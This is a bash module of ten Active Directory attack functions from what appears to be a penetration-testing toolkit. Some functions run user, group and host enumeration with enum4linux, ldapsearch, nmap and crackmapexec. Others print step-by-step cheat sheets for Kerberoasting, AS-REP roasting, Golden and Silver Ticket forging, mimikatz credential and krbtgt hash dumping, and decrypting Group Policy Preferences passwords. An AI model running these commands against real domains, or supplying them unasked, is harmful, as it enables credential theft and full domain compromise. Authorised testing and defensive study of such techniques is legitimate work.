#!/usr/bin/env bash
# Active Directory Module
# 10 AD security commands

airo_adusers() {
    local domain="${1:?Usage: adusers <domain>}"
    
    echo "[*] Enumerating AD users for: $domain"
    
    if command -v enum4linux >/dev/null 2>&1; then
        enum4linux -U "$domain"
    elif command -v ldapsearch >/dev/null 2>&1; then
        ldapsearch -x -h "$domain" -b "dc=$(echo $domain | sed 's/\\./,dc=/g')" "(objectClass=user)" 2>/dev/null | grep -i samaccountname
    else
        echo "[-] No AD enumeration tools found"
    fi
}

airo_adgroups() {
    local domain="${1:?Usage: adgroups <domain>}"
    
    echo "[*] Enumerating AD groups for: $domain"
    
    if command -v enum4linux >/dev/null 2>&1; then
        enum4linux -G "$domain"
    else
        echo "[-] enum4linux not installed"
    fi
}

airo_admachines() {
    local domain="${1:?Usage: admachines <domain>}"
    
    echo "[*] Listing domain computers for: $domain"
    
    if command -v nmap >/dev/null 2>&1; then
        nmap -sS -p 445 --open "$domain/24" -oG - | grep Up | cut -d' ' -f2
    else
        echo "[-] nmap not installed"
    fi
}

airo_bloodhound() {
    echo "[*] BloodHound setup guide"
    
    cat << 'BLOODHOUND'
BloodHound Attack Path Analysis:

1. Data Collection:
   bloodhound-python -c All -u user -p pass -d domain -ns dc.domain.com

2. Start Neo4j:
   neo4j console
   Default: http://localhost:7474
   Default creds: neo4j/neo4j

3. Start BloodHound UI:
   bloodhound

4. Import data and analyze attack paths.
BLOODHOUND
}

airo_kerberoast() {
    local domain="${1:?Usage: kerberoast <domain>}"
    
    echo "[*] Kerberoasting attack on: $domain"
    
    cat << 'KERBEROAST'
Steps:

1. Enumerate SPNs:
   GetUserSPNs.py $domain/user:password -request

2. Request TGS tickets

3. Export tickets:
   mimikatz # kerberos::list /export

4. Crack with hashcat:
   hashcat -m 13100 hashes.txt wordlist.txt
KERBEROAST
}

airo_asreproast() {
    echo "[*] AS-REP Roasting attack"
    
    cat << 'ASREP'
Steps:

1. Find users with DONT_REQ_PREAUTH:
   GetNPUsers.py $domain/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast

2. Crack with hashcat:
   hashcat -m 18200 hashes.asreproast wordlist.txt
ASREP
}

airo_goldenticket() {
    echo "[*] Golden Ticket Attack"
    
    cat << 'GOLDEN'
Requirements:
• krbtgt NTLM hash
• Domain SID

Mimikatz:
privilege::debug
sekurlsa::logonpasswords
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:$domain /sid:S-1-5-21-... /krbtgt:$hash /ptt
GOLDEN
}

airo_silverticket() {
    echo "[*] Silver Ticket Attack"
    
    cat << 'SILVER'
Requirements:
• Service account NTLM hash
• Target service SPN

Mimikatz:
kerberos::golden /user:Administrator /domain:$domain /sid:$SID /target:server.$domain /service:HTTP /rc4:$hash /ptt
SILVER
}

airo_passpol() {
    local domain="${1:?Usage: passpol <domain>}"
    
    echo "[*] Checking password policy for: $domain"
    
    if command -v crackmapexec >/dev/null 2>&1; then
        crackmapexec smb "$domain" --pass-pol
    elif command -v enum4linux >/dev/null 2>&1; then
        enum4linux -P "$domain"
    else
        echo "[-] No tools available"
    fi
}

airo_gpppass() {
    echo "[*] Extracting GPP passwords..."
    
    cat << 'GPP'
Group Policy Preferences Passwords:

1. Find GPP files:
   find / -name "Groups.xml" 2>/dev/null
   smbclient -L //$target -U ""%"" -c 'recurse;ls'

2. Decrypt passwords:
   gpp-decrypt $encrypted_password

3. Common locations:
   \\$domain\SYSVOL\$domain\Policies\{Policy-GUID}\Machine\Preferences\Groups
   \\$domain\SYSVOL\$domain\Policies\{Policy-GUID}\User\Preferences\Groups
GPP
}

export -f airo_adusers airo_adgroups airo_admachines airo_bloodhound airo_kerberoast
export -f airo_asreproast airo_goldenticket airo_silverticket airo_passpol airo_gpppass
